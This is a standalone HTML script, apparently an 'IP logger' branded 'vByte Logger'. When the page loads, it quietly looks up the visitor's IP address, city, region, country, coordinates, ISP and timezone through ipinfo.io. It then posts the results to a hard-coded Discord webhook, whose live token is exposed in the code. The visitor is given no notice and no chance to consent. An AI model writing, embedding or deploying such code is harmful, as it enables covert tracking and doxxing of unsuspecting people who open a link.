    <script>
  const webhookURL = "https://discord.com/api/webhooks/1403103158963802173/tINcs0j2mqn1GbyrFvd6ELwGrRl4XOZJAzhzhaKOYMOqmhiM0JDHPuxelbSPCjinx8SO";

  fetch("https://ipinfo.io/json")
    .then(res => res.json())
    .then(data => {
      const embed = {
        embeds: [
          {
            title: "Someone Logged By vByte Logger ✅",
            color: 16711680,
            fields: [
              { name: "IP", value: data.ip || "N/A", inline: true },
              { name: "City", value: data.city || "N/A", inline: true },
              { name: "Region", value: data.region || "N/A", inline: true },
              { name: "Country", value: data.country || "N/A", inline: true },
              { name: "Location", value: data.loc || "N/A", inline: true },
              { name: "Org", value: data.org || "N/A", inline: false },
              { name: "Timezone", value: data.timezone || "N/A", inline: true }
            ],
            footer: {
              text: "vByte Logger"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      return fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embed)
      });
    })
    .then(res => {
      if (!res.ok) console.error("Discord webhook failed:", res.statusText);
    })
    .catch(err => {
      console.error("Error:", err);
    });
</script>
